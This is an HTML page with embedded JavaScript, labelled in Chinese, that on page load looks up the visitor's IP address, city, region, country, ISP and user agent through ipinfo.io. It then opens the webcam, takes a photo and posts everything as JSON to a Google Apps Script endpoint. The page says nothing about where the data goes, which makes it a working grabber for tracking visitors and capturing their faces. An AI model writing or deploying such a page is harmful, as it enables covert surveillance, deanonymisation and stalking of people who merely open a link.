<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP 定位與照片記錄</title>
</head>
<body>
  <h1>自動拍攝照片並記錄資ㄌ訊</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">尚未開始操作</p>

  <script>
    // 獲取 IP 和地理位置信息
    async function getIpInfo() {
      try {
        // 取得使用者的 IP 資訊
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;

        // 拍攝照片並轉換為 Base64
        const photoBlob = await takePhoto();
        const photoBase64 = await blobToBase64(photoBlob);

        // 發送 POST 請求到 Google Apps Script
        await sendDataToServer({ ip, ipType, userAgent, city, region, country, org, photo: photoBase64 });
      } catch (error) {
        console.error('錯誤:', error);
        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 發送資料到伺服器
    async function sendDataToServer(data) {
      try {
        const response = await fetch('https://script.google.com/macros/s/AKfycbzcnnTJhvMWa4eMTVqMAmMxx3z2xydLrAJSXFDg-3RY6ZO56SBvLpt-S_ypsFGkOfHxEA/exec', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });

        const result = await response.json();
        if (result.success) {
          document.getElementById('status').innerText = '上傳成功！資料已傳至伺服器。';
        } else {
          document.getElementById('status').innerText = '上傳失敗，伺服器返回錯誤。';
          console.error('伺服器錯誤:', result.error);
        }
      } catch (error) {
        console.error('請求失敗:', error);
        document.getElementById('status').innerText = '資料傳輸失敗。';
      }
    }

    // 拍攝照片
    async function takePhoto() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      const photoBlob = await imageCapture.takePhoto();
      videoTrack.stop(); // 停止攝像頭
      return photoBlob;
    }

    // Blob 轉 Base64 編碼
    function blobToBase64(blob) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]); // 返回 Base64 資料
        reader.onerror = reject;
        reader.readAsDataURL(blob);
      });
    }

    // 開始執行
    document.addEventListener('DOMContentLoaded', () => getIpInfo());
  </script>
</body>
</html>
